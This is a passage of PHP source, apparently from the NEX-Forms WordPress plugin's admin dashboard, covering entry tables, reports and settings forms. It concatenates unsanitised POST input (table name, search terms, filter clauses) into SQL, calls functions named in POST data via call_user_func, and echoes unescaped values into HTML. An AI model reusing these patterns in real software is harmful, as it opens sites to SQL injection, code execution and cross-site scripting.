			$page_num = isset($_POST['page']) ? $_POST['page'] : 0;
			$page_num = filter_var($page_num ,FILTER_SANITIZE_NUMBER_INT);
			
			$page_num = isset($_POST['page']) ? $_POST['page'] : 0;
			$page_num = filter_var($page_num ,FILTER_SANITIZE_NUMBER_INT);
			$search_term = isset($_POST['search_term']) ? $_POST['search_term'] : '';
			$limit = 10;			
			
			$nf_functions = new NEXForms_Functions();
			
			if($_POST['header_params'])
				{
				$set_header_params = isset($_POST['header_params']) ? $_POST['header_params'] : '';
				$header_params = json_decode(str_replace('\\','',$set_header_params),true);
				}
			else
				$header_params = $this->table_headings;
				
			if($_POST['additional_params'])
				{
				$set_params = isset($_POST['additional_params']) ? $_POST['additional_params'] : '';
				$additional_params = json_decode(str_replace('\\','',$set_params),true);
				}
			else
				$additional_params = $this->additional_params;
				
			if($_POST['field_selection'])
				{
				$set_field_selection = isset($_POST['field_selection']) ? $_POST['field_selection'] : '';
				$field_selection = json_decode(str_replace('\\','',$set_field_selection),true);
				}
			else
				$field_selection = $this->field_selection;	
			
			if($_POST['search_params'])
				{
				$set_search_params = isset($_POST['search_params']) ? $_POST['search_params'] : '';
				$search_params = json_decode(str_replace('\\','',$set_search_params),true);
				}
			else
				$search_params = $this->search_params;
			
			if($_POST['table'])
				$table = $_POST['table'];
			else
				$table = $this->table;
				
			$where_str = '';
			
			$show_cols = filter_var($_POST['showhide_fields'] ,FILTER_SANITIZE_STRING);
			
			if(is_array($additional_params))
				{
				foreach($additional_params as $clause)
					{
					$like = '';
					if($clause['operator'] == 'LIKE' || $clause['operator'] == 'NOT LIKE')
						$like = '%';
					$where_str .= ' AND `'.$clause['column'].'` '.(($clause['operator']!='') ? $clause['operator'] : '=').'  "'.$like.$clause['value'].$like.'"';
					}
				}
			
			$select_fields = '*';
			if(is_array($field_selection))
				{
				$j=1;
				$select_fields = '';
				foreach($field_selection as $field_select)
					{
					
					if($j<count($field_selection))
						 $select_fields .= '`'.$field_select.'`,';
					else
						$select_fields .= '`'.$field_select.'`';
					$j++;
					}
				}
			else
				{
				$select_fields = '*';	
				}
				
			$count_search_params = count($search_params);
			if(is_array($search_params) && $search_term)
				{
				if($count_search_params>1)
					{
					$where_str .= ' AND (';
					$loop_count = 1;
					foreach($search_params as $column)
						{
						if($loop_count==1)
							$where_str .= '`'.$column.'` LIKE "%'.$search_term.'%" ';
						else
							$where_str .= ' OR `'.$column.'` LIKE "%'.$search_term.'%" ';
							
						$loop_count++;
						}
					$where_str .= ') ';
					}
				else
					{
					foreach($search_params as $column)
						{
						$where_str .= ' AND `'.$column.'` LIKE "%'.$search_term.'%" ';
						}
					}
				}
			
			if($_POST['entry_report_id'])
				{
				$where_str .= ' AND nex_forms_Id = '.filter_var($_POST['entry_report_id'] ,FILTER_SANITIZE_NUMBER_INT);
				$nex_forms_id = filter_var($_POST['entry_report_id'] ,FILTER_SANITIZE_NUMBER_INT);
				}
			if($_POST['form_id'])
				{
				$where_str .= ' AND nex_forms_Id = '.filter_var($_POST['form_id'] ,FILTER_SANITIZE_NUMBER_INT);
				$nex_forms_id = filter_var($_POST['form_id'] ,FILTER_SANITIZE_NUMBER_INT);
				}
			
			if($_POST['table'])
				$output = '<div class="total_table_records hidden">'.NEXForms_Database_Actions::get_total_records($table,$additional_params,$nex_forms_id, $search_params,$search_term).'</div>';
		
			
			
			$get_records = 'SELECT '.$select_fields.' FROM '.$wpdb->prefix.$table.'  WHERE Id<>"" '.$where_str.' ORDER BY Id DESC LIMIT '.($page_num*10).',10';
			$records = $wpdb->get_results($get_records);
			
			$get_temp_table_details = get_option('tmp_csv_export');
			update_option('tmp_csv_export',array('query'=>$get_records,'cols'=>$field_selection,'form_Id'=>$get_temp_table_details['form_Id']));
			
			$img_ext_array = array('jpg','jpeg','png','tiff','gif','psd');
			$file_ext_array = array('doc','docx','mpg','mpeg','mp3','mp4','odt','odp','ods','pdf','ppt','pptx','txt','xls','xlsx');
				foreach($records as $record)
					{
					$output .= '<tr class="form_record" id="'.$record->Id.'">';
						//$output .= '<td class="record-selection"><input id="rs-'.$record->Id.'" class="filled-in" name="record-selected[]" value="'.$record->Id.'" type="checkbox"><label for="rs-'.$record->Id.'"></label></td>';
						foreach($header_params as $key=>$val)
							{
							//$val = trim($val);
							if(is_array($val))
								{
								$func_args_1 = $val['user_func_args_1'];
								$func_args_2 = $val['user_func_args_2'];
								$func_args_3 = $val['user_func_args_3'];
								$func_args_4 = $val['user_func_args_3'];
								$func_args_5 = $val['user_func_args_4'];
								$func_args_6 = $val['user_func_args_5'];
								
								if($val['user_func_class'])
									$output .= '<td>'.call_user_func(array($val['user_func_class'],$val['user_func']), array($record->$func_args_1, $func_args_2)).'</td>';
								else
									$output .= '<td>'.call_user_func($val['user_func'], $record->$func_args).'</td>';
								}
							else
								{
								if($val)
									{
									if($nf_functions->isJson($record->$val) && !is_numeric($record->$val))
										{
										//$output .= '<td>'.$record->$val.'</td>';
										$output .= '<td class="'.$val.'">';
										$json = json_decode($record->$val,1);
										foreach($json as $value)
											{
											$output .= '<span class="fa fa-check"></span> '.$value.'<br />';
											}
										$output .= '</td>';
										}
									else if(strstr($record->$val,',') && !strstr($record->$val,'data:image'))
										{
										$is_array = explode(',',$record->$val);
										$output .= '<td class="image_td '.$val.'">';
										foreach($is_array as $item)
											{
											if(in_array($nf_functions->get_ext($item),$img_ext_array))
												$output .= '<img class="materialboxed"  width="65px" src="'.$item.'">';
											else if(in_array($nf_functions->get_ext($item),$file_ext_array))
												$output .= '<a class="btn file_upload_link" href="'.$item.'" target="_blank"><i class="material-icons">insert_drive_file</i> '.$nf_functions->get_ext($item).'</a>';
											else
												$output .= $item;
											}
										$output .= '</td>';
										}
									else if(strstr($record->$val,'data:image'))
										$output .= '<td class="'.$val.'"><img  width="100px" src="'.$record->$val.'" /></td>';
									else if(in_array($nf_functions->get_ext($record->$val),$img_ext_array) && $val!='name')
										$output .= '<td class="'.$val.'"><img class="materialboxed"  width="65px" src="'.$record->$val.'"></td>';
									else
										$output .= '<td class="'.$val.'">'.$nf_functions->view_excerpt($record->$val,18).'</td>';
									
									}
								else
									$output .= '<td>&nbsp;</td>';
								}
							}
						$output .= '<td class="td_right"><i id="'.$record->Id.'" data-table="'.$table.'" class="delete-record material-icons tooltipped_off" title="Delete" data-position="top" data-delay="10" data-html="true" data-tooltip="Delete">delete</i></td>';
					$output .= '</tr>';
					}
			
			if(!$records)
				{
				$output .= '<tr>';	
				$output .= '<td colspan="100" background=""><div class="alert alert-info">Sorry, no records found.</div></td>';
				$output .= '</tr>';	
				}
				
			if($_POST['do_ajax'])
				{
				echo $output;
				die();
				}
			else
				return $output;
		}
		public function get_total_entries($form_Id){
			global  $wpdb;
			
			if(is_array($form_Id))
				$set_form_id = $form_Id[0];
			$total_entries = $wpdb->get_var('SELECT count(*) FROM '.$wpdb->prefix.'wap_nex_forms_entries WHERE nex_forms_Id='.$set_form_id);
			return $total_entries;
		}
		public function duplicate_record($form_Id){
			global  $wpdb;
			
			if(is_array($form_Id))
				$set_form_id = $form_Id[0];
				
			return '<a id="'.$set_form_id.'" class="duplicate_record tooltipped" data-position="top" data-delay="10" data-html="true" data-tooltip="Duplicate Form"><i class="material-icons">content_copy</i></a>';
		}
		public function link_form_title($form_Id){
			global  $wpdb;
			
			if(is_array($form_Id))
				$set_form_id = $form_Id[0];
			$title = $wpdb->get_var('SELECT title FROM '.$wpdb->prefix.'wap_nex_forms WHERE Id='.$set_form_id);
			return '<a href="'.get_admin_url().'admin.php?page=nex-forms-builder&open_form='.$set_form_id.'" class="edit_record tooltipped" data-position="top" data-delay="10" data-html="true" data-tooltip="Edit Form"><i class="material-icons">create</i></a>';
		}
		
		public function print_export_form_link($form_Id){
			global  $wpdb;
			
			if(is_array($form_Id))
				$set_form_id = $form_Id[0];
			$title = $wpdb->get_var('SELECT title FROM '.$wpdb->prefix.'wap_nex_forms WHERE Id='.$set_form_id);
			return '<a href="'.get_option('siteurl').'/wp-admin/admin.php?page=nex-forms-dashboard&nex_forms_Id='.$set_form_id.'&export_form=true" title="" class="export_form tooltipped" data-position="top" data-delay="10" data-html="true" data-tooltip="Export Form"><i class="material-icons">cloud_download</i></a>';
		}
		
		
		
		public function print_form_entry(){
			
			global $wpdb;
			$output = '';
			$output .= '<div class="dashboard-box form_entry_view">';
				
				
				$output .= '<div class="dashboard-box-header">';
					$output .= '<div class="table_title"><i class="material-icons header-icon">assignment_turned_in</i> <span class="header_text">Form Entry Data</span></div>';
					
					
					$output .= '<button class="cancel_save_form_entry save_button btn waves-effect waves-light" style="display:none;"><i class="fa fa-close"></i></button>';
					$output .= '<button class="save_form_entry save_button btn waves-effect waves-light" style="display:none;">Save</button>';
					
					//$output .= '<a target="_blank" disabled="disabled" title="PDF [new window]" href="http://localhost/wp4.7.3/wp-content/plugins/nex-forms-export-to-pdf/examples/main.php?entry_ID=3128" class="btn waves-effect waves-light pdf_form_entry"><span class="fa fa-file-pdf-o"></span> PDF</a>';
					$output .= '<button class="btn waves-effect waves-light print_to_pdf" disabled="disabled">PDF</button>';
					$output .= '<button class="btn waves-effect waves-light print_form_entry" disabled="disabled">Print</button>';
					$output .= '<button id="" class="btn waves-effect waves-light edit_form_entry" disabled="disabled">Edit</button>';
				$output .= '</div>';
				/*
				$output .= '<div class="dashboard-box-header row">';
					$output .= '<button id="" class="btn waves-effect waves-light edit_form_entry tooltipped" data-position="top" data-tooltip="Edit form entry"><i class="material-icons">edit</i></button>';
					$output .= '<button class="save_form_entry btn waves-effect waves-light tooltipped" style="display:none;" data-position="top" data-tooltip="Save changes to entry"><i class="material-icons">save</i></button>';
					$output .= '<button class="cancel_save_form_entry btn waves-effect waves-light tooltipped " data-position="top" data-tooltip="Cancel" style="display:none;"><i class="fa fa-close"></i></button>';
					$output .= '<button class="btn waves-effect waves-light print_form_entry tooltipped" data-position="top" data-tooltip="Print entry"><i class="material-icons">print</i></button>';
					$output .= '<button class="btn waves-effect waves-light pdf_form_entry tooltipped" data-position="top" data-tooltip="Print to PDF"><i class="material-icons">picture_as_pdf</i></button>';
				$output .= '</div>';
				*/
				$output .= '<div  class="dashboard-box-content form_entry_data">';
				$output .= '<table class="highlight" id="form_entry_table"><thead><tr><th>Field Name</th><th>Field Value</th></tr></thead></table>';
				$output .= '</div>';
					
			$output .= '</div>';
			
			return $output;
		}
		
	public function do_form_entry_save(){
		
		global $wpdb;
		
		$edit_id = $_POST['form_entry_id'];
		
		unset($_POST['action']);
		unset($_POST['submit']);
		unset($_POST['form_entry_id']);
		
		foreach($_POST as $key=>$val)
			{
			$data_array[] = array('field_name'=>$key,'field_value'=>$val);
			}
		print_r($data_array);
		$update = $wpdb->update ( $wpdb->prefix . 'wap_nex_forms_entries',array(
				'form_data'=>json_encode($data_array)
		), array(	'Id' => filter_var($edit_id,FILTER_SANITIZE_NUMBER_INT)) );
		
		echo $update;
		
		die();
		}
		
		
		
	public function submission_report(){
			global $wpdb;
			
			/*echo '<pre>';
			print_r($_POST['additional_params']);
			echo '</pre>';
			*/
			$set_additional_params = array();
			$nf_functions = new NEXForms_Functions();
			
			if($_POST['field_selection'])
					{
					$field_selection = isset($_POST['field_selection']) ? $_POST['field_selection'] : '';
					//$field_selection = json_decode(str_replace('\\','',$set_field_selection),true);
					}
				else
					$field_selection = $this->field_selection;
			
			
			$get_records = 'SELECT * FROM '.$wpdb->prefix.'wap_nex_forms_entries WHERE nex_forms_Id='.filter_var($_POST['form_Id'] ,FILTER_SANITIZE_NUMBER_INT);
			$records = $wpdb->get_results($get_records);
			
			$get_temp_table_details = get_option('tmp_csv_export');
			update_option('tmp_csv_export',array('query'=>$get_temp_table_details['query'],'cols'=>$get_temp_table_details['cols'],'form_Id'=>filter_var($_POST['form_Id'] ,FILTER_SANITIZE_NUMBER_INT)));
			
			foreach($records as $data)
				{
				$form_values = json_decode($data->form_data);
				
				$header_array['entry_Id'] = $data->Id;
				
				foreach($form_values as $field)
					{
					if(is_array($field_selection))
						{
						if(in_array($field->field_name,$field_selection))
							{
							$header_array_filters[$field->field_name] = $nf_functions->unformat_name($field->field_name);
							}
						}
					else
						{
						$header_array_filters[$field->field_name] = $nf_functions->unformat_name($field->field_name);
						}
					$header_array[$field->field_name] = $nf_functions->unformat_name($field->field_name);
					}
				};
			
			$drop_table = 'DROP TABLE '.$wpdb->prefix.'wap_nex_forms_temp_report';
			
			$wpdb->query($drop_table);
			
			$nf_functions = new NEXForms_Functions();
			
			$sql .= 'CREATE TABLE `'.$wpdb->prefix.'wap_nex_forms_temp_report` (';	
					
					$sql .= '`Id` BIGINT(255) unsigned NOT NULL AUTO_INCREMENT,';
				
					foreach($header_array as $key => $val){
						
						$col_name = $nf_functions->format_column_name($key);
						$sql .= '`'.$col_name.'` longtext,';
					}
				$sql .= 'PRIMARY KEY (`Id`)
					) ENGINE=InnoDB DEFAULT CHARSET=utf8;';
				
				$wpdb->query($sql);
				
				
			  $table_fields 	= $wpdb->get_results('SHOW FIELDS FROM '.$wpdb->prefix.'wap_nex_forms_temp_report');
			
			  foreach($records as $data)
					{
					$form_fields = json_decode($data->form_data);

					$column_array = array();
					
					
					$column_array['entry_Id'] = $data->Id;
					
					foreach($table_fields as $table_field)
						{
						foreach($form_fields as $form_field)
							{
							if(is_array($form_field->field_value))
								$form_field->field_value = json_encode($form_field->field_value);
							
							if($form_field->field_name==$table_field->Field)
								{
								$column_array[$table_field->Field] = $form_field->field_value;
								}	
							}
						}
					$insert = $wpdb->insert ( $wpdb->prefix . 'wap_nex_forms_temp_report' , $column_array );
					$insert_id = $wpdb->insert_id;
					}
			 // $set_headers['0']	= '';
			  foreach($header_array as $key=>$val)
			  	{
				if(is_array($field_selection))
					{
					if(in_array($key,$field_selection))
						{
						$set_headers[$key]	= $key;
						$set_search[$key]	= $key;
						}
					}
				else
					{
					$set_headers[$key]	= $key;
					$set_search[$key]	= $key;
					}
				}
			
			$output .= '<div class="row row_zero_margin reporting_controls">';
				
				$show_cols = $_POST['showhide_fields'];
				
				$output .= '<div class="show_fields_container"><div class="col s3"><a class="dropdown-button btn" href="#" data-activates="dropdown1">Show Fields</a>';
				$output .= '<ul id="dropdown1" class="dropdown-content dropdown-checkboxes">';
				$show_cols = explode(',',$show_cols);
				$i = 0;
				 
				if($_POST['field_selection'])
					{
					$field_selection = isset($_POST['field_selection']) ? $_POST['field_selection'] : '';
					//$field_selection = json_decode(str_replace('\\','',$set_field_selection),true);
					}
				else
					$field_selection = $this->field_selection;
				 
				 foreach($header_array as $key=>$val)
					{
					if(is_array($field_selection))
						{
						$output .= '<li><input type="checkbox" class="filled-in"  name="showhide_fields[]" '.((in_array($key,$field_selection)) ? 'checked' : '').' id="test'.$key.'" value="'.$key.'" />
								<label for="test'.$key.'">'.$val.'</label></li>';
						}
					else
						{
						$output .= '<li><input type="checkbox" class="filled-in" name="showhide_fields[]" checked id="test'.$key.'" value="'.$key.'" />
								<label for="test'.$key.'">'.$val.'</label></li>';	
						}
					$i++;
					}
					$output .= '</ul></div>';
				 $output .= '<div class="col s1">';
						$output .= '<a class="btn add_new_where_clause"><i class="material-icons">add</i></a>';	
					 $output .= '</div>';
				
				$output .= '<div class="col s8 clause_container">';
				
				foreach($_POST['additional_params'] as $key=>$val)
					{
						
					$output .= '<div class="new_clause">';
					$output .= '<div class="col s4">';
						$output .= '<select class="post_ajax_select" name="column">
									  <option value="">--- Select field ---</option>';
										foreach($header_array_filters as $key2=>$val2)
											$output .= ' <option value="'.$key2.'" '.(($val['column']==$key2) ? 'selected="selected"' : '').'>'.$val2.'</option>';
						$output .= '</select>';	
					 $output .= '</div>';
					 
					 $output .= '<div class="col s2">';
						$output .= '
									<select class="post_ajax_select" name="operator">
									  <option value="=" 		'.(($val['operator']=='=') 			? 'selected="selected"' : '').'>Equal to</option>
									  <option value="<>" 		'.(($val['operator']=='<>') 		? 'selected="selected"' : '').'>Not equal</option>
									  <option value=">" 		'.(($val['operator']=='>') 			? 'selected="selected"' : '').'>Greater than</option>
									  <option value="<" 		'.(($val['operator']=='<') 			? 'selected="selected"' : '').'>Less than</option>
									  <option value="LIKE" 		'.(($val['operator']=='LIKE') 		? 'selected="selected"' : '').'>Contains</option>
									  <option value="NOT LIKE" 	'.(($val['operator']=='NOT LIKE') 	? 'selected="selected"' : '').'>Does not contain</option>
									  ';
						$output .= '</select>';	
					$output .= '</div>';
					
					$output .= '<div class="col s5">';
						$output .= '<input name="column_value" placeholder="Value" value="'.$val['value'].'">';	
					 $output .= '</div>';
					 
					 $output .= '<div class="col s1">';
						$output .= '<a class="btn remove_where_clause">X</a>';	
					 $output .= '</div>';
				$output .= '</div>';
						
					$set_additional_params[$val['column']] = $val['value'];
					}
				
				$output .= '</div>';
				
				$output .= '<div class="clause_replicator hidden">';
					$output .= '<div class="col s4">';
						$output .= '
									<select class="post_ajax_select" name="column">
									  <option value="" selected="selected">--- Select field ---</option>';
										foreach($header_array_filters as $key=>$val)
											$output .= ' <option value="'.$key.'">'.$val.'</option>';
						$output .= '</select>';	
					 $output .= '</div>';
					 
					 $output .= '<div class="col s2">';
						$output .= '
									<select class="post_ajax_select" name="operator">
									  <option value="=">Equal to</option>
									  <option value="<>">Not equal</option>
									  <option value=">">Greater than</option>
									  <option value="<">Less than</option>
									  <option value="LIKE">Contains</option>
									  <option value="NOT LIKE">Does not contain</option>
									  ';
						$output .= '</select>';	
					$output .= '</div>';
					
					$output .= '<div class="col s5">';
						$output .= '<input name="column_value" placeholder="Value">';	
					 $output .= '</div>';
					 
					 $output .= '<div class="col s1">';
						$output .= '<a class="btn remove_where_clause">X</a>';	
					 $output .= '</div>';
				$output .= '</div>';
				
				$output .= '</div>';
				// $output .= '<div class="report_footer">';
				 	
				 	$output .= '<a class="btn run_query" id="'.$_POST['form_Id'].'"><span class="fa fa-filter"></span> Run Report</a>';
				 //$output .= '</div>';
				  
			$output .= '</div>';
			  
			  $database = new NEXForms_Database_Actions();

			  $report = new NEXForms_dashboard();
			  $report->table = 'wap_nex_forms_temp_report';
			  $report->table_header = 'Report';
			  $report->table_header_icon = 'view_list';
			  $report->action_button = 'add';
			  $report->table_headings = $set_headers;
			  $report->show_headings=true;
			  $report->search_params = $set_search;
			  $report->extra_buttons = array('Export'=>array('class'=>'export-csv', 'type'=>'link','link'=>admin_url().'admin.php?page=nex-forms-dashboard&amp;export_csv=true', 'icon'=>'Export to Excel(CSV)'), 'PDF'=>array('class'=>'print_report_to_pdf', 'type'=>'button','link'=>'', 'icon'=>'Export to PDF'));
			  $report->checkout = $database->checkout();
			  if($_POST['field_selection'])
			 	 $report->field_selection = $_POST['field_selection'];
			  $report->additional_params = $_POST['additional_params'];
			  
			$output .= $report->print_record_table();
			echo $output;
			die();
		}	
		
	public function	print_to_pdf()
		{
		if (function_exists('NEXForms_export_to_PDF'))
			{
			echo NEXForms_export_to_PDF($_POST['form_entry_Id'], true, true);
			}
		else
			{
			echo 'not installed';
			die();	
			}
		}
	public function	print_report_to_pdf()
		{
		if (function_exists('NEXForms_report_to_PDF'))
			{
			echo NEXForms_report_to_PDF();
			}
		else
			{
			echo 'not installed';
			die();	
			}
		}
	
	
	public function email_setup(){
		$email_config = get_option('nex-forms-email-config');
		$output = '';	
		$output .= '<div class="dashboard-box global_settings">';
			$output .= '<div class="dashboard-box-header">';
				$output .= '<div class="table_title"><i class="material-icons header-icon">drafts</i><span class="header_text ">Email Setup</span></div>';
			$output .= '</div>';
			
			$output .= '<div  class="dashboard-box-content">';
				$output .= '<form name="email_config" id="email_config" action="'.admin_url('admin-ajax.php').'" method="post">		
							
								
									<div class="row">
										<div class="col-sm-4">Email Format</div>
										<div class="col-sm-8">
											<input type="radio" '.(($email_config['email_content']=='html' || !$email_config['email_content']) ? 	'checked="checked"' : '').' name="email_content" value="html" 	id="html" class="with-gap"><label for="html">HTML</label>
											<input type="radio" '.(($email_config['email_content']=='pt') ? 	'checked="checked"' : '').' name="email_content" value="pt" 	id="pt"	class="with-gap"><label for="pt">Plain Text</label>
										</div>
									</div>
									
									<div class="row">
										<div class="col-sm-4">Mailing Method</div>
										<div class="col-sm-8">
											<input type="radio" '.((!$email_config['email_method'] || $email_config['email_method']=='php_mailer') ? 	'checked="checked"' : '').' name="email_method" value="php_mailer" 	id="php_mailer"	class="with-gap"><label for="php_mailer">PHP Mailer</label><br />
											<input type="radio" '.(($email_config['email_method']=='wp_mailer') ? 	'checked="checked"' : '').' name="email_method" value="wp_mailer" 	id="wp_mailer"	class="with-gap"><label for="wp_mailer">WP Mail</label><br />
											<input type="radio" '.(($email_config['email_method']=='php') ? 		'checked="checked"' : '').' name="email_method" value="php" 		id="php"		class="with-gap"><label for="php">Normal PHP</label><br />
											<input type="radio" '.(($email_config['email_method']=='api') ? 		'checked="checked"' : '').' name="email_method" value="api" 		id="api"		class="with-gap"><label for="api">API (note: no attachements)</label><br />
											<input type="radio" '.(($email_config['email_method']=='smtp') ? 		'checked="checked"' : '').' name="email_method" value="smtp" 		id="smtp"		class="with-gap"><label for="smtp">SMTP</label><br />
											
										</div>
									</div>
									
									<div class="smtp_settings" '.(($email_config['email_method']!='smtp') ? 		'style="display:none;"' : '').'>
										<h5>SMTP Setup</h5>
										<div class="row">
											<div class="col-sm-4">Host</div>
											<div class="col-sm-8">
												<input class="form-control" type="text" name="smtp_host" placeholder="eg: mail.gmail.com" value="'.$email_config['smtp_host'].'">
											</div>
										</div>
										
										<div class="row">
											<div class="col-sm-4">Port</div>
											<div class="col-sm-8">
												<input class="form-control" type="text" name="mail_port" placeholder="likely to be 25, 465 or 587" value="'.$email_config['mail_port'].'">
											</div>
										</div>
										
										<div class="row">
											<div class="col-sm-4">Security</div>
											<div class="col-sm-8">
												<input type="radio" '.(($email_config['email_smtp_secure']=='0' || !$email_config['email_smtp_secure']) ? 	'checked="checked"' : '').' name="email_smtp_secure" value="0" id="none" class="with-gap"><label for="none">None</label>
												<input type="radio" '.(($email_config['email_smtp_secure']=='ssl') ? 	'checked="checked"' : '').'  name="email_smtp_secure" value="ssl" id="ssl" class="with-gap"><label for="ssl">SSL</label>
												<input type="radio" '.(($email_config['email_smtp_secure']=='tls') ? 	'checked="checked"' : '').'  name="email_smtp_secure" value="tls" id="tls" class="with-gap"><label for="tls">TLS</label>
											</div>
										</div>
										
										<div class="row">
											<div class="col-sm-4">Authentication</div>
											<div class="col-sm-8">
												<input type="radio" '.(($email_config['smtp_auth']=='1') ? 	'checked="checked"' : '').'  name="smtp_auth" value="1" 		id="auth_yes"		class="with-gap"><label for="auth_yes">Use Authentication</label>
												<input type="radio" '.(($email_config['smtp_auth']=='0') ? 	'checked="checked"' : '').'  name="smtp_auth" value="0" 		id="auth_no"		class="with-gap"><label for="auth_no">No Authentication</label>
											</div>
										</div>
										
									</div>
									
									<div class="smtp_auth_settings" '.(($email_config['email_method']!='smtp' || $email_config['smtp_auth']!='1') ? 		'style="display:none;"' : '').'>
										<h5>SMTP Authentication</h5>
										<div class="row">
											<div class="col-sm-4">Username</div>
											<div class="col-sm-8">
												<input class="form-control" type="text" name="set_smtp_user" value="'.$email_config['set_smtp_user'].'">
											</div>
										</div>
										<div class="row">
											<div class="col-sm-4">Password</div>
											<div class="col-sm-8">
												<input class="form-control" type="password" name="set_smtp_pass" value="'.$email_config['set_smtp_pass'].'">
											</div>
										</div>
									</div>
									
									
										<button class="btn blue waves-effect waves-light">&nbsp;&nbsp;&nbsp;Save Email Setup&nbsp;&nbsp;&nbsp;</button>
										<div style="clear:both;"></div>
									
									
										
								
					</form></div>';
			
		$output .= '<div class="dashboard-box-footer">
											<input type="text" class="form-control" name="test_email_address" value="" placeholder="Enter Email Address">
										
											<div class="btn blue waves-effect waves-light send_test_email full_width">Send Test Email</div>
											<div style="clear:both"></div>
										</div></div>';
		return $output;
	}
	
	
	public function email_subscriptions_setup(){
		
		$output = '';
			$output .= '<div class="dashboard-box global_settings ">';
							$output .= '<div class="dashboard-box-header">';
								$output .= '<div class="table_title"><i class="material-icons header-icon contact_mail">contact_mail</i><span class="header_text ">Email Subscriptions Setup</span></div>';
								$output .= '
								<nav class="nav-extended dashboard_nav dashboard-box-nav">
									<div class="nav-content">
									  <ul class="tabs_nf tabs_nf-transparent">
										<li class="tab"><a class="active" href="#mail_chimp">MailChimp</a></li>
										<li class="tab"><a href="#get_response">GetResponse</a></li>
									  </ul>
									</div>
								 </nav>';
							$output .= '</div>';
							
							$output .= '<div  class="dashboard-box-content">';
								$output .= '<div id="mail_chimp">';
									$output .= $this->print_mailchimp_setup();
								$output .= '</div>';
								
								$output .= '<div id="get_response">';
									$output .= $this->print_getresponse_setup();
								$output .= '</div>';
								
							$output .= '</div>';
						$output .= '</div>';
		return $output;
	}
	
	public function print_mailchimp_setup(){
		
		$output = '';	
		
		$output .= '
				<form name="mail_chimp_setup" id="mail_chimp_setup" action="'.admin_url('admin-ajax.php').'" method="post">
					<div class="row">
						<div class="col-sm-4">Mailchimp API key</div>
						<div class="col-sm-8">
							<input class="form-control" type="text" name="mc_api" value="'.get_option('nex_forms_mailchimp_api_key').'" id="mc_api" placeholder="Enter your Mailchimp API key">
						</div>
					</div>
					<div class="alert alert-info">
						<strong>How to get your Mailchimp API key:</strong>
						<ol>
							<li>Login to your Mailchimp account: <a href="http://mailchimp.com/" target="_blank">mailchimp.com</a></li>
							<li>Click on your profile picture (top right of the screen)</li>
							<li>From the dropdown Click on Account</li>
							<li>Click on Extras->API Keys</li>
							<li>Copy your API key, or create a new one</li>
							<li>Paste your API key in the above field.</li>
							<li>Save</li>
						</ol>
					</div>
					
					
					<button class="btn blue waves-effect waves-light">&nbsp;&nbsp;&nbsp;Save MailChimp API&nbsp;&nbsp;&nbsp;</button>
					<div style="clear:both"></div>
				</form>
					';
		
		
		return $output;
	}
	
	public function print_getresponse_setup(){
		
		$output = '';	
		
		$output .= '
				<form name="get_response_setup" id="get_response_setup" action="'.admin_url('admin-ajax.php').'" method="post">
					<div class="row">
						<div class="col-sm-4">GetResponse API key</div>
						<div class="col-sm-8">
							<input class="form-control" type="text" name="gr_api" value="'.get_option('nex_forms_get_response_api_key').'" id="gr_api" placeholder="Enter your GetResponse API key">
						</div>
					</div>
					<div class="alert alert-info">
						<strong>How to get your GetReponse API key:</strong>
						<ol>
							<li>Login to your GetResponse account: <a href="https://app.getresponse.com/" target="_blank">GetResponse</a></li>
							<li>Hover over your profile picture (top right of the screen)</li>
							<li>From the dropdown Click on Integrations</li>
							<li>Click on API &amp; OAuth</li>
							<li>Copy your API key, or create a new one</li>
							<li>Paste your API key in the above field.</li>
							<li>Save</li>
						</ol>
					</div>
					
					
					<button class="btn blue waves-effect waves-light">&nbsp;&nbsp;&nbsp;Save GetResponse API&nbsp;&nbsp;&nbsp;</button>
					<div style="clear:both"></div>
				</form>
					';
		
		return $output;
	}
	
	
	
	public function wp_admin_options(){
		$other_config = get_option('nex-forms-other-config');
		
		$output = '';	
		$output .= '<div class="dashboard-box global_settings">';
			$output .= '<div class="dashboard-box-header">';
				$output .= '<div class="table_title"><i class="material-icons header-icon">accessibility</i><span class="header_text ">WP Admin Accessibility Options</span></div>';
			$output .= '</div>';
			
			$output .= '<div  class="dashboard-box-content">';
				$output .= '<form name="other_config" id="other_config" action="'.admin_url('admin-ajax.php').'" method="post">		
							
								
						<!--<div class="row">
									<div class="col-sm-4">Admin Color Adapt</div>
									<div class="col-sm-8">
										<label  for="enable-color-adapt-1">			<input type="radio" '.(($other_config['enable-color-adapt']=='1') ? 	'checked="checked"' : '').'  name="enable-color-adapt" value="1" 		id="enable-color-adapt-1"		><strong> Yes</strong> <em>(NEX-Forms admin will adapt to the Wordpress color scheme)</em></label>
										<label  for="enable-color-adapt-0">			<input type="radio" '.(($other_config['enable-color-adapt']=='0' || !$other_config['enable-color-adapt']) ? 	'checked="checked"' : '').'  name="enable-color-adapt" value="0" 		id="enable-color-adapt-0"		><strong> No</strong> <em>(Use default NEX-Forms admin colors)</em></label>
									</div>
								</div>-->
								
								<div class="row">
									<div class="col-sm-6">NEX-Forms User Level</div>
									<div class="col-sm-6">
										
										<select name="set-wp-user-level" id="set-wp-user-level" class="material_select">
											<option '.(($other_config['set-wp-user-level']=='subscriber') ? 	'selected="selected"' : '').'  value="subscriber">Subscriber</option>
											<option '.(($other_config['set-wp-user-level']=='contributor') ? 	'selected="selected"' : '').' value="contributor">Contributor</option>
											<option '.(($other_config['set-wp-user-level']=='author') ? 	'selected="selected"' : '').' value="author">Author</option>
											<option '.(($other_config['set-wp-user-level']=='editor') ? 	'selected="selected"' : '').' value="editor">Editor</option>
											<option '.(($other_config['set-wp-user-level']=='administrator' || !$other_config['set-wp-user-level']) ? 	'selected="selected"' : '').' value="administrator">Administrator</option>			
										</select>
										
									</div>
								</div>
								
								<div class="row">
									<div class="col-sm-6">Enable NEX-Forms TinyMCE Button</div>
									<div class="col-sm-6">
										
										<div class="switch">
											<label>
											  No
											  <input type="checkbox" '.(($other_config['enable-tinymce']=='1') ? 	'checked="checked"' : '').'  name="enable-tinymce" value="1" 		id="enable-tinymce">
											  <span class="lever"></span>
											  Yes
											</label>
										</div>
										
									</div>
								</div>
								
								<div class="row">
									<div class="col-sm-6">Enable NEX-Forms Widget</div>
									<div class="col-sm-6">
										
										<div class="switch">
											<label>
											  No
											  <input type="checkbox" '.(($other_config['enable-widget']=='1') ? 	'checked="checked"' : '').'  name="enable-widget" value="1" 		id="enable-widget">
											  <span class="lever"></span>
											  Yes
											</label>
										</div>
										
									</div>
								</div>
						
						
							<button class="btn blue waves-effect waves-light">&nbsp;&nbsp;&nbsp;Save WP Admin Options&nbsp;&nbsp;&nbsp;</button>
							<div style="clear:both;"></div>
						
									
										
								
					</form></div></div>';
		return $output;
	}
